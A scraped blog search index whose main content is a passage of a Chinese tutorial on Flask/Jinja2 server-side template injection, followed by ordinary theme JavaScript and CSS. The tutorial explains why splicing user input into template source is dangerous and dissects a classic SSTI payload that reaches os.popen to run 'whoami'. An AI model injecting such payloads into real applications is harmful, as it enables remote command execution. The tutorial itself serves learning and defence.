&#x27;tuple&#x27;&gt;! 这个时候，我们发现两个攻击都被解析了。这是因为Jinja2中的安全处理是针对我们后面传进去的需要渲染的参数，并不会对模板源代码中的内容再进行检查，因为没有经过处理，所以他们一个被浏览器正常解析，一个被Jinja2根据语法正常解析，最终导致出现漏洞。 而使用render_template_string这个函数需要我们手写模板源代码，就比较容易出现这样的错误。所以以后我们只需要看代码中是否将我们输入的内容先和模板源代码进行拼接再进行渲染，一但出现这个，就说明存在ssti注入，无论是使用哪一个模板渲染函数都是一样的。所以我们在开发中需要格外注意这一点。 当然，在真实的开发环境中，有的时候我们就是需要先将用户的输入和我们的模板源代码进行拼接，再进行渲染解析，以实现复杂的业务逻辑或者特定功能。这个时候我们就需要做好严格的过滤和限制。 Jinja2中的模板环境什么是模板环境？模板环境是 Jinja2 的核心概念，用于管理模板的全局变量、过滤器、测试和其他配置。模板环境决定了哪些全局变量和函数可以在模板中使用，并提供了模板渲染的上下文。默认情况下，Jinja2 的模板环境不包含所有的 Python 内置函数，只包含一些常用的全局变量和函数。 我们来看一个例子： 12345678from jinja2 import Templatetemplate = Template(&quot;&quot;&quot;&#123;&#123;type(123)&#125;&#125;&quot;&quot;&quot;)print(type(123))print(template.render()) 运行之后，第一个输出&lt;class ‘int’&gt;，第二个报错jinja2.exceptions.UndefinedError: ‘type’ is undefined。 type是python中内置的函数，我们是可以直接使用的，第一个输出也验证过了是没有问题的。但是在使用Jinja2模板引擎进行解析时，却出现了报错 type is undefined，这就是因为Jinja2中的模板环境中没有包含type函数的定义。 在 Jinja2 中，模板环境是通过 Environment 类来定义的。模板渲染时，Template 类会使用一个 Environment 实例来管理模板的渲染过程。实际上，Template 类是所有渲染函数的底层，因此使用任何渲染函数时，都会受到同一个模板环境的影响，也就是说，所有的模板共享同一个环境。 所以 type is undefined 这个报错是由于模板环境导致的，有些人会以为是Jinja2中的沙箱机制导致的，实质上启用沙箱环境，需要手动使用 jinja2.sandbox.SandboxedEnvironment 类来创建模板环境才行，这个类继承的就是Environment类。 默认的模板环境Jinja2 的模板环境包含许多配置，如全局变量、过滤器和测试函数。全局变量是可以直接在模板中访问的变量；过滤器是函数，使用时需要通过管道符 | 调用，因此不能通过过滤器访问 __globals__ 属性；测试函数用于条件判断，使用时需要通过 is 关键字。 我们分别来举一个例子： 12345678&#123;&#123;joiner&#125;&#125; //输出&lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;，这里joiner就是一个全局变量&#123;&#123;&quot;haha&quot; | length&#125;&#125; //输出4，这里length就是一个过滤器&#123;% if 4 is even %&#125;4 is even&#123;% else %&#125;4 is not even&#123;% endif %&#125;// 输出even，这里even就是一个测试函数 我们来看一下默认的全局变量有哪些？是定义在Jinja2的default.py中。 一共有6个，其中前两个是python中的内置类，是使用c语言写的，我们不能通过他们来获取对应的__globals__属性；后面四个，第一个是一个函数，后面三个是一个类，都是在Jinja2的utils.py中定义的，是使用python写的，我们可以通过他们来获取对应的__globals__属性。 然后还有过滤器和测试函数，因为这两个有点多，所以这里不再张贴出来，他们分别是在Jinja2中的filters.py和tests.py。 在针对ssti的过滤中，我们经常借助全局变量和过滤器来进行绕过。但是我们这里不详细讲解这些配置的作用，因为显得太啰嗦。在后面讲解ssti绕过的文章中，我们会讲解几个经典的借助过滤器和全局变量来进行绕过的利用。 flask中的上下文环境Flask 中的 上下文环境（Context）是指在请求处理过程中，Flask 提供的一种机制，用于在不同的部分（如视图函数、模板、全局对象等）间共享和访问请求和应用的相关数据。它包括请求上下文和应用上下文。 请求上下文 **request**：包含当前 HTTP 请求的所有信息，例如请求方法、路径、数据（表单、JSON 等）、头部信息、cookies 等。 **session**：用于存储与当前会话相关的信息。session 是一个类似字典的对象，常用于存储用户登录状态、用户偏好等会话数据。 **g**：一个全局对象，可以用于在请求期间存储临时数据（如用户身份信息、数据库连接等）。g 的数据只在当前请求上下文内有效。 **url_for()**：生成应用中指定视图函数的 URL。它可以动态构建路由的 URL 地址。 **get_flashed_messages()**： 是 Flask 用来显示闪存消息的函数。闪存消息可以用于传递一次性的信息，如提示、警告等。 应用上下文 current_app：当前 Flask 应用实例，用于访问应用配置和全局信息。 config ：是 Flask 应用的配置对象，包含应用的所有配置信息 g：用于存储应用级别的共享数据。 这里只是列举了几个而已，但是这里列举的几个都是可以直接在模版中访问使用的（除了current_app，看有的资料说可以，但是测试了一下不行），就像模版空间中的全局变量一样，这也是我们为什么要在这里提他。 在进行ssti注入的时候，我们可以借助他们来构造payload，其中的request和session我们还可以借助他们来进行绕过。这里先提前了解一下。 注意，这里我们需要将他们和Jinja2中的模板环境中的全局变量区分开来，模板环境中的全局变量是可以直接在Jinja2中使用，但是应用上下文中的全局变量需要flask来进行注入（这个过程是自动的，不需要我们操作）之后才能进行使用。 之所以要提供这样的上下文环境，一方面肯定是为了数据共享，另一方面也是为了线程安全，这种方法也简化了程序员对一些基础性代码的重复书写，更加关注业务逻辑本身的实现。这些了解即可。 Jinja2中的两种语法结构1234&#123;&#123;&#125;&#125;用于输出变量的值或表达式的结果。&#123;%%&#125;用于执行控制结构，如条件判断、循环、宏定义等。它不会直接输出内容，而是用于控制模板的逻辑和流程。 ssti中使用到的魔术属性和魔术方法前置知识我们先来看一个经典的ssti注入语句。 12345().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()//注意，如果要使用这个payload进行本地测试的话，这里需要找到重写了__init__魔术方法的类的对应索引//我这里412这个索引对应的类就重写了__init__方法，关于这点后面会进行讲解 这个payload很绕，应该说ssti的payload都是绕的，就是因为我们前面提到的模板环境。整个模板环境中就定义了6个全局变量，我们要想使用对应的函数执行系统命令，就需要先找到对应的函数的定义。 魔术属性： 1234__class__ //返回对象所属的类__base__ //返回对象直接继承的父类，如果有多个，按照继承的顺序返回第一个__globals__ //返回函数定义时的全局命名空间，也就是返回函数所在py文件的全局变量，返回的是一个字典类型__builtins__ //返回python中的内置模块，返回的是一个字典类型 魔术方法： 12__subclasses__() //返回一个类所有直接继承该类的子类__init__() //创建对象实例时进行初始化，可以类比php中的__construct方法 一些细节： python中有一个object类，在python中定义一个类的时候，如果没有指定继承哪一个类，那么默认继承的就是object类。所以相当于python中的所有类都会继承object这个类，只不过有的是直接的，有的是间接的。 object类中定义了python中的一些基础的魔术方法，因为继承的关系，所有的类中都含有这些魔术方法，我们可以在类中将这些魔术方法进行重写。 python中其实函数和方法是两种定义，像我前面讲到的那些函数，实际上都是方法。方法是定义在类中，我们要通过类去调用，而函数独立在类外，我们可以直接调用。但是我们都可以通过他们去访问__globals__属性。这个时候我们其实使用的是方法或者函数的引用，你可以理解为c语言中的指针。所以在我们的payload中__init__魔术方法后面是没有加上括号的，加上了括号就代表着去执行这个方法而不是引用。 object类中的魔术方法是由c语言进行实现的，我们查看这些魔术方法的类型，会发现是&lt;class &#39;wrapper_descriptor&#39;&gt;；我们前面说了，__globals__属性代表的是函数定义时的全局命名空间，但是因为object类的魔术方法的具体实现不是在py文件中，这个时候去借助魔术方法访问__globals__属性就会报错AttributeError: &#39;wrapper_descriptor&#39; object has no attribute &#39;__globals__&#39;。 当我们在类中重写魔术方法，这个时候的魔术方法就是由python语言实现的，魔术方法的类型就会变成&lt;class &#39;function&#39;&gt;，我们就可以借助魔术方法访问__globals__属性。因为__init__这个魔术方法会在创建对象实例时进行初始化，所以一般类中都会重写这个魔术方法，这也就是为什么很多payload都是使用了__init__。但是我们要知道使用其他方法也是可以的。 python中的数据容器本身都是一个类，而且我们可以分别使用各种符号去直接创建对应数据容器的实例对象，上面的()代表的就是一个元组的实例对象，只不过这个元组为空，没有储存任何数据。 payload解析12345678910().__class__ //获取这个实例对象的所属类，也就是元组 &lt;class &#x27;tuple&#x27;&gt;().__class__.__base__ //元组没有指定继承类，所以是直接继承object，这里就会返回&lt;class &#x27;object&#x27;&gt;().__class__.__base__.__subclasses__() //返回所有直接继承object的子类().__class__.__base__.__subclasses__()[412] //找到重写了__init__方法的子类__init__.__globals__.__builtins__ //获取python中的内置模块__import__(&#x27;os&#x27;) //通过内置模块中的内置方法__import__导入模块os，os中含有可以执行系统命令的popen//到这一步我们就完成了前面说的想要在模板环境中使用对应的函数，就要找到对应函数的定义popen(&#x27;whoami&#x27;).read() //执行系统命令，因为返回的结果包装成一个文件对象，所以要调read()来获取结果 小结在一开始写这一篇文章的时候，我本来还想着介绍一下python中的数据容器，因为ssti手注出现错误时一般和这里有关，还有我们的一些绕过也和他有关。但是想着这里毕竟不是重点，再加上内容较为基础，就不再写了。 其实这篇文章讲得还是比较浅，很多东西只是点到为止，像root_render_func这个函数的python代码到底是怎么生成的以及Jinja2中的沙箱机制的实现等，因为本人也不是很了解，所以没有进行深入。不过从了解和入门ssti注入漏洞这个角度来看，这篇文章是够了。 事后补充说明函数是可以直接访问__builtins__属性的，在写绕过时才发现的。因为文章本身懒得改了，所以在这里说明一下。其实影响也不大。","tags":["python","ssti","flask","payload解析","Jinja2模板引擎"],"categories":["python","ssti","前置基础知识"]},{"title":"友链","path":"/friends/index.html","content":"暂无。"},{"title":"About","path":"/about/index.html","content":"一名普普通通的信息安全专业在读学生，主页是学习，副业是摸鱼。 本博客主要是分享一些web安全方面的知识，以及一些ctf比赛的wp。 有事可以通过github联系，在导航栏左下角（不过不一定来得及回复）。"},{"path":"/assets/js/main.js","content":"// utils const util = { // https://github.com/jerryc127/hexo-theme-butterfly diffDate: (d, more = false) => { const dateNow = new Date() const datePost = new Date(d) const dateDiff = dateNow.getTime() - datePost.getTime() const minute = 1000 * 60 const hour = minute * 60 const day = hour * 24 let result if (more) { const dayCount = dateDiff / day const hourCount = dateDiff / hour const minuteCount = dateDiff / minute if (dayCount > 14) { result = null } else if (dayCount >= 1) { result = parseInt(dayCount) + ' ' + ctx.date_suffix.day } else if (hourCount >= 1) { result = parseInt(hourCount) + ' ' + ctx.date_suffix.hour } else if (minuteCount >= 1) { result = parseInt(minuteCount) + ' ' + ctx.date_suffix.min } else { result = ctx.date_suffix.just } } else { result = parseInt(dateDiff / day) } return result }, copy: (id, msg) => { const el = document.getElementById(id); if (el) { el.select(); document.execCommand(\"Copy\"); if (msg && msg.length > 0) { hud.toast(msg, 2500); } } }, toggle: (id) => { const el = document.getElementById(id); if (el) { el.classList.toggle(\"display\"); } }, scrollTop: () => { window.scrollTo({top: 0, behavior: \"smooth\"}); }, scrollComment: () => { document.getElementById('comments').scrollIntoView({behavior: \"smooth\"}); }, viewportLazyload: (target, func, enabled = true) => { if (!enabled || !(\"IntersectionObserver\" in window)) { func(); return; } const observer = new IntersectionObserver((entries) => { if (entries[0].intersectionRatio > 0) { func(); observer.disconnect(); } }); observer.observe(target); } } const hud = { toast: (msg, duration) => { const d = Number(isNaN(duration) ? 2000 : duration); var el = document.createElement('div'); el.classList.add('toast'); el.classList.add('show'); el.innerHTML = msg; document.body.appendChild(el); setTimeout(function(){ document.body.removeChild(el) }, d); }, } // defines const l_body = document.querySelector('.l_body'); const init = { toc: () => { utils.jq(() => { const scrollOffset = 32; var segs = []; $(\"article.md-text :header\").each(function (idx, node) { segs.push(node); }); function activeTOC() { var scrollTop = $(this).scrollTop(); var topSeg = null; for (var idx in segs) { var seg = $(segs[idx]); if (seg.offset().top > scrollTop + scrollOffset) { continue; } if (!topSeg) { topSeg = seg; } else if (seg.offset().top >= topSeg.offset().top) { topSeg = seg; } } if (topSeg) { $(\"#data-toc a.toc-link\").removeClass(\"active\"); var link = \"#\" + topSeg.attr(\"id\"); if (link != '#undefined') { const highlightItem = $('#data-toc a.toc-link[href=\"' + encodeURI(link) + '\"]'); if (highlightItem.length > 0) { highlightItem.addClass(\"active\"); } } else { $('#data-toc a.toc-link:first').addClass(\"active\"); } } } function scrollTOC() { const e0 = document.querySelector('#data-toc .toc'); const e1 = document.querySelector('#data-toc .toc a.toc-link.active'); if (e0 == null || e1 == null) { return; } const offsetBottom = e1.getBoundingClientRect().bottom - e0.getBoundingClientRect().bottom + 100; const offsetTop = e1.getBoundingClientRect().top - e0.getBoundingClientRect().top - 64; if (offsetTop < 0) { e0.scrollBy({top: offsetTop, behavior: \"smooth\"}); } else if (offsetBottom > 0) { e0.scrollBy({top: offsetBottom, behavior: \"smooth\"}); } } var timeout = null; window.addEventListener('scroll', function() { activeTOC(); if(timeout !== null) clearTimeout(timeout); timeout = setTimeout(function() { scrollTOC(); }.bind(this), 50); }); }) }, sidebar: () => { utils.jq(() => { $(\"#data-toc a.toc-link\").click(function (e) { sidebar.dismiss(); }); }) }, relativeDate: (selector) => { selector.forEach(item => { const $this = item const timeVal = $this.getAttribute('datetime') let relativeValue = util.diffDate(timeVal, true) if (relativeValue) { $this.innerText = relativeValue } }) }, /** * Tabs tag listener (without twitter bootstrap). */ registerTabsTag: function () { // Binding `nav-tabs` & `tab-content` by real time permalink changing. document.querySelectorAll('.tabs .nav-tabs .tab').forEach(element => { element.addEventListener('click', event => { event.preventDefault(); // Prevent selected tab to select again. if (element.classList.contains('active')) return; // Add & Remove active class on `nav-tabs` & `tab-content`. [...element.parentNode.children].forEach(target => { target.classList.toggle('active', target === element); }); // https://stackoverflow.com/questions/20306204/using-queryselector-with-ids-that-are-numbers const tActive = document.getElementById(element.querySelector('a').getAttribute('href').replace('#', '')); [...tActive.parentNode.children].forEach(target => { target.classList.toggle('active', target === tActive); }); // Trigger event tActive.dispatchEvent(new Event('tabs:click', { bubbles: true })); }); }); window.dispatchEvent(new Event('tabs:register')); }, } // init init.toc() init.sidebar() init.relativeDate(document.querySelectorAll('#post-meta time')) init.registerTabsTag()"},{"title":"更多","path":"/more/index.html","content":"暂无更多其他信息，只是单纯觉得导航栏放4个比较好看。"},{"path":"/assets/js/search/algolia-search.js","content":"utils.jq(() => { var $inputArea = $(\"input#search-input\"); if ($inputArea.length === 0) { return; } var $resultArea = $(\"#search-result\"); var $searchWrapper = $(\"#search-wrapper\"); var client = algoliasearch(window.searchConfig.appId, window.searchConfig.apiKey); var index = client.initIndex(window.searchConfig.indexName); function filterResults(hits, filterPath) { if (!filterPath || filterPath === '/') return hits; var regex = new RegExp(filterPath); return hits.filter(hit => regex.test(hit.url)); } function displayResults(hits) { var $resultList = $(\"\").addClass(\"search-result-list\"); if (hits.length === 0) { $searchWrapper.addClass('noresult'); } else { $searchWrapper.removeClass('noresult'); hits.forEach(function(hit) { var contentSnippet = hit._snippetResult.content.value; var title = hit.hierarchy.lvl1 || 'Untitled'; var $item = $(\"\").html(`${title}${contentSnippet}`); $resultList.append($item); }); } $resultArea.html($resultList); } $inputArea.on(\"input\", function() { var query = $(this).val().trim(); var filterPath = $inputArea.data('filter'); if (query.length"},{"path":"/assets/js/plugins/copycode.js","content":"window.codeElements.forEach((codeElement) => { // 创建复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.className = 'copy-btn'; codeCopyBtn.textContent = ctx.copycode.default_text; codeElement.appendChild(codeCopyBtn); // 添加点击事件监听 codeCopyBtn.addEventListener('click', async () => { const codeToCopy = codeElement.querySelector('pre')?.innerText || ''; if (navigator.clipboard) { try { await navigator.clipboard.writeText(codeToCopy); codeCopyBtn.textContent = ctx.copycode.success_text; codeCopyBtn.classList.add('success'); hud.toast(ctx.copycode.toast, 2500); } catch (error) { codeCopyBtn.textContent = '未获得用户许可'; codeCopyBtn.classList.add('warning'); } } else { codeCopyBtn.textContent = '浏览器不支持/非HTTPS'; codeCopyBtn.classList.add('warning'); } // 3秒后恢复默认文本 setTimeout(() => { codeCopyBtn.textContent = ctx.copycode.default_text; codeCopyBtn.classList.remove('success', 'warning'); }, 3000); }); });"},{"path":"/assets/css/main.css","content":":root { --width-main: 720px; --fsp: 17px; --fsh2: calc(var(--fsp) + 11px); --fsh3: calc(var(--fsp) + 7px); --fsh4: calc(var(--fsp) + 4px); --side-content-width: 224px; --gap-margin: 16px; --gap-padding: 16px; --gap-p: calc(17px + 4px); --gap-p-compact: calc(17px * 0.75); } @media screen and (min-width: 2048px) { :root { --width-main: 780px; } } @media screen and (min-width: 2560px) { :root { --width-main: 860px; } } @media screen and (max-width: 768px) { :root { --side-content-width: 188px; } } @media screen and (max-width: 667px) { :root { --side-content-width: 224px; } } :root { --gap-max: calc(var(--gap-margin) + var(--gap-padding)); } .l_body.story { --gap-p: 2rem; } .l_body.story div.tag-plugin, .l_body.story p>img { margin-top: 2.4rem; margin-bottom: 2.4rem; } :root { --theme-link: #2094f3; } :root[data-theme=\"light\"] { --site-bg: #f9fafb; --card: #fff; --block: #f1f2f3; --block-border: #e3e5e8; --block-hover: #e9eaec; --theme-link-opa: rgba(32,148,243,0.2); --leftbar-bg: #e3e5e8; --alpha20: rgba(255,255,255,0.2); --alpha50: rgba(255,255,255,0.5); --alpha60: rgba(255,255,255,0.6); --alpha75: rgba(255,255,255,0.75); --alpha100: #fff; --text: #000; --text-p1: #333; --text-p2: #4d4d4d; --text-p3: #808080; --text-p4: #999; --text-meta: #ccc; --text-code: #14181f; } :root[data-theme=\"dark\"] { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --theme-link-opa: rgba(32,148,243,0.4); --leftbar-bg: #383d42; --alpha20: rgba(0,0,0,0.2); --alpha50: rgba(0,0,0,0.5); --alpha60: rgba(0,0,0,0.6); --alpha75: rgba(0,0,0,0.75); --alpha100: #000; --text: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #fff; } @media screen and (max-width: 667px) { :root[data-theme=\"dark\"] { --site-bg: #000; } } :root:not([data-theme]) { --site-bg: #f9fafb; --card: #fff; --block: #f1f2f3; --block-border: #e3e5e8; --block-hover: #e9eaec; --theme-link-opa: rgba(32,148,243,0.2); --leftbar-bg: #e3e5e8; --alpha20: rgba(255,255,255,0.2); --alpha50: rgba(255,255,255,0.5); --alpha60: rgba(255,255,255,0.6); --alpha75: rgba(255,255,255,0.75); --alpha100: #fff; --text: #000; --text-p1: #333; --text-p2: #4d4d4d; --text-p3: #808080; --text-p4: #999; --text-meta: #ccc; --text-code: #14181f; } @media (prefers-color-scheme: dark) { :root:not([data-theme]) { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --theme-link-opa: rgba(32,148,243,0.4); --leftbar-bg: #383d42; --alpha20: rgba(0,0,0,0.2); --alpha50: rgba(0,0,0,0.5); --alpha60: rgba(0,0,0,0.6); --alpha75: rgba(0,0,0,0.75); --alpha100: #000; --text: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #fff; } } @media screen and (prefers-color-scheme: dark) and (max-width: 667px) { :root:not([data-theme]) { --site-bg: #000; } } pre { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; tab-size: 4; -moz-tab-size: 4; -o-tab-size: 4; -webkit-tab-size: 4; } a { text-decoration: none; color: var(--theme-link); } a:hover { color: #ff5724; } .md-text p:not([class]) { text-align: left; } hr { color: var(--text-meta); opacity: 0.1; } img { max-width: 100%; } li { font-size: calc(var(--fsp) - 1px); } ul, ol { padding-left: 1.5rem; } table:not([class]) { border-collapse: collapse; overflow: auto; display: block; margin: 1rem 0; max-width: 100%; vertical-align: text-top; --fsp: calc(17px - 2px); font-size: var(--fsp); } table:not([class]) th { background: var(--block); } table:not([class]) td, table:not([class]) th { padding: 0.5em 1em; border: 1px solid var(--block-hover); line-height: 1.5; } table:not([class]) tr { word-break: keep-all; white-space: nowrap; } table:not([class]) tr:hover { background: var(--block); } *[ff=title] { font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; } blockquote { display: block; margin-left: 0; margin-right: 0; padding: 0.25rem 0.75rem; background: var(--block); border-left: 4px solid var(--text-meta); border-radius: 4px 12px 12px 4px; color: var(--text-p2); } :root { --blur-px: 12px; --blur-bg: var(--alpha50); } .blur { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .blur { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .blur:hover { background: var(--card); } button { border: none; font-weight: 500; outline: none; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; cursor: pointer; } a.button { font-weight: 500; line-height: 1; padding: 0.75rem 2rem; border-radius: 4px; font-size: 0.9375rem; user-select: none; } a.button.theme { background: #1cd0fd; color: var(--card); } a.button.theme:hover { background: #ff5724; } a.button.start { border-radius: 100px; background: var(--text-p1); color: var(--card); } a[onclick]:hover { cursor: pointer; } a.button.start.gradient { position: relative; } :root[data-theme=\"dark\"] a.button.start.gradient { transition: 0.38s ease-out; z-index: 0; background: linear-gradient(to right, #4c95fa, #38c9fa, #24f9c4, #24f9c4, #38c9fa, #4c95fa); background-size: 1000%; color: #fff; text-shadow: 0 0 1px rgba(0,0,0,0.12); animation: glow 60s linear infinite; } :root[data-theme=\"dark\"] a.button.start.gradient:after { content: ''; position: absolute; left: 0; right: 0; top: 0; bottom: 0; border-radius: 100px; background: inherit; z-index: -1; filter: blur(12px); opacity: 0.5; transition: 0.38s ease-out; } :root[data-theme=\"dark\"] a.button.start.gradient:hover:after { filter: blur(36px); opacity: 1; } @-moz-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-webkit-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-o-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @media (prefers-color-scheme: dark) { :root:not([data-theme]) a.button.start.gradient { transition: 0.38s ease-out; z-index: 0; background: linear-gradient(to right, #4c95fa, #38c9fa, #24f9c4, #24f9c4, #38c9fa, #4c95fa); background-size: 1000%; color: #fff; text-shadow: 0 0 1px rgba(0,0,0,0.12); animation: glow 60s linear infinite; } :root:not([data-theme]) a.button.start.gradient:after { content: ''; position: absolute; left: 0; right: 0; top: 0; bottom: 0; border-radius: 100px; background: inherit; z-index: -1; filter: blur(12px); opacity: 0.5; transition: 0.38s ease-out; } :root:not([data-theme]) a.button.start.gradient:hover:after { filter: blur(36px); opacity: 1; } @-moz-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-webkit-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-o-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } } .cap { font-weight: 500; font-size: 0.8125rem; scrollbar-width: none; color: var(--text-p2); } .cap.blue { color: #0d87e9; } .cap.cyan { color: #03c3f5; } .cap.theme { color: #03cafc; } .dis-select { -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; } .mobile-only { display: none; } @media screen and (max-width: 667px) { .mobile-only { display: block !important; } } @media screen and (max-width: 667px) { .mobile-hidden { display: none !important; } } .float-panel { position: sticky; grid-column-end: span 3; right: 0; bottom: 2rem; float: right; z-index: 10; display: flex; flex-direction: column; border-radius: 8px; margin-left: auto; margin-right: 1rem; overflow: hidden; --blur-px: 16px; --blur-bg: rgba(255,255,255,0.4); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } @media screen and (min-width: 667px) { .float-panel { margin-right: 2rem; } } :root[data-theme=\"dark\"] .float-panel { --blur-bg: rgba(0,0,0,0.4); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .float-panel { --blur-bg: rgba(0,0,0,0.4); } } .float-panel button { cursor: pointer; color: var(--text); background: none; padding: 8px; line-height: 0; font-size: 28px; margin: 0; display: flex; } .float-panel button >* { width: auto; height: 28px; } .float-panel button >* path#sep { transition: transform 0.2s ease-out; -moz-transition: transform 0.2s ease-out; -webkit-transition: transform 0.2s ease-out; -o-transition: transform 0.2s ease-out; } .l_body[leftbar] .float-panel, .l_body[rightbar] .float-panel { box-shadow: 0 0 4px -1px #1cd0fd, 0 0 16px -4px #1cd0fd, 0 0 32px -12px #1cd0fd, 0 0 128px -32px #1cd0fd; } .l_body[leftbar] .float-panel button.leftbar-toggle { background: var(--alpha100); } .l_body[leftbar] .float-panel button.leftbar-toggle { color: #1cd0fd; border-color: var(--block-border); } .l_body[leftbar] .float-panel button.leftbar-toggle svg g { fill: currentColor; fill-opacity: 0.3; } .l_body[leftbar] .float-panel button.leftbar-toggle svg g path#sep { transform: translateX(2px); } .l_body .l_right:empty+.float-panel button.rightbar-toggle { display: none !important; } .l_body[rightbar] .float-panel button.rightbar-toggle { background: var(--alpha100); } .l_body[rightbar] .float-panel button.rightbar-toggle { color: #1cd0fd; border-color: var(--block-border); } .l_body[rightbar] .float-panel button.rightbar-toggle svg g { fill: currentColor; fill-opacity: 0.3; } .l_body[rightbar] .float-panel button.rightbar-toggle svg g path#sep { transform: translateX(2px); } code { -webkit-font-smoothing: auto; -moz-osx-font-smoothing: auto; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } p>code:not([class]), li>code:not([class]) { font-size: 85%; background: var(--block); padding: 0.2em; border-radius: 4px; color: var(--text-code); } .md-text .highlight, pre:not([class]):has(>code) { margin: var(--gap-p) 0; border-radius: 12px; overflow: hidden; background: var(--block); line-height: 1.5; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; box-sizing: border-box; } @media screen and (min-width: 500px) { .md-text .highlight, pre:not([class]):has(>code) { min-width: 180px; } } .md-text .highlight { position: relative; overflow: auto; display: block; } .md-text .highlight figcaption { color: var(--text-p2); font-size: 0.8125rem; font-weight: 500; margin-left: 0.5rem; display: inline-block; } .md-text .highlight figcaption span { padding: 4px 0.5rem; display: block; border-bottom-left-radius: 4px; border-bottom-right-radius: 4px; background: var(--block-hover); } .md-text .highlight >table { overflow: auto; display: block; margin: 0 !important; background: transparent; border: none; } .md-text .highlight >table td, .md-text .highlight >table th { padding: 0; border: none; line-height: 1.5; } .md-text .highlight >table::-webkit-scrollbar { height: 4px; width: 4px; } .md-text .highlight >table::-webkit-scrollbar-track-piece { background: transparent; } .md-text .highlight >table::-webkit-scrollbar-thumb { background: transparent; cursor: pointer; border-radius: 8px; } .md-text .highlight >table:hover::-webkit-scrollbar-thumb { background: var(--text-meta); } .md-text .highlight >table:hover::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .md-text .highlight >table tr { background: transparent; } .md-text .highlight >table tr:hover { background: transparent; } .md-text .highlight .gutter { pointer-events: none; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; text-align: right; padding: 0 1em; border-width: 0; margin-left: 0; left: 0; z-index: 1; } .md-text .highlight .gutter pre .line { color: var(--text-p4); } .md-text .highlight .code pre { display: block; padding: 0.5em 1rem; } .md-text .highlight .gutter+.code pre { padding-left: 0.25em; } .md-text .gist .gist-file { border: 1px solid var(--block-border); border-radius: 12px; overflow: hidden; } .md-text .gist .gist-data { border-bottom: 1px solid var(--block-border); } .md-text .gist .highlight { display: inherit; border: none; border-radius: 0; background: var(--block); margin: 0; padding: 1em 0; } .md-text .gist .blob-code-inner { color: var(--text-p1); font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } .md-text .gist .gist-meta { background: var(--block-border); } table:not([class]) { border-collapse: collapse; } .md-text pre >.caption { color: var(--text-p3); } .md-text pre >.hljs { padding: 1rem; border-radius: 12px; line-height: 1.5; box-sizing: border-box; } .md-text .highlight .code { vertical-align: top; } .md-text .highlight .code:before { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); } .md-text .highlight.yaml .code:before { content: \"YAML\"; } .md-text .highlight.json .code:before { content: \"JSON\"; } .md-text .highlight.diff .code:before { content: \"diff\"; } .md-text .highlight.html .code:before { content: \"HTML\"; } .md-text .highlight.js .code:before, .md-text .highlight.javascript .code:before { content: \"JS\"; } .md-text .highlight.css .code:before { content: \"CSS\"; } .md-text .highlight.less .code:before { content: \"Less\"; } .md-text .highlight.stylus .code:before { content: \"Stylus\"; } .md-text .highlight.bash .code:before { content: \"bash\"; } .md-text .highlight.shell .code:before { content: \"shell\"; } .md-text .highlight.sh .code:before { content: \"sh\"; } .md-text .highlight.ini .code:before { content: \"ini\"; } .md-text .highlight.c .code:before { content: \"C\"; } .md-text .highlight.cpp .code:before { content: \"C++\"; } .md-text .highlight.objc .code:before, .md-text .highlight.objectivec .code:before { content: \"Objective-C\"; } .md-text .highlight.swift .code:before { content: \"Swift\"; } .md-text .highlight.java .code:before { content: \"Java\"; } .md-text .highlight.python .code:before { content: \"Python\"; } .md-text .highlight.php .code:before { content: \"PHP\"; } .md-text .highlight.rust .code:before, .md-text .highlight.rs .code:before { content: \"Rust\"; } .md-text .highlight.sql .code:before { content: \"SQL\"; } .md-text .highlight.ruby .code:before { content: \"Ruby\"; } .md-text .highlight.makefile .code:before { content: \"Makefile\"; } .md-text .highlight.go .code:before { content: \"Go\"; } .md-text .highlight.typescript .code:before, .md-text .highlight.ts .code:before { content: \"TS\"; } .md-text .highlight.matlab .code:before { content: \"MATLAB\"; } .code>pre .code:before { display: none; } .code>pre .line, .code>pre .params { color: var(--text-p1); } .code>pre .line .addition { color: #3fa33f; } .code>pre .line .deletion { color: #ee2b29; } .code>pre .marked { background-color: rgba(254,213,66,0.4); padding: 2px 8px 2px 0; border-radius: 2px; width: 100%; } .code>pre .title, .code>pre .attr, .code>pre .attribute { color: 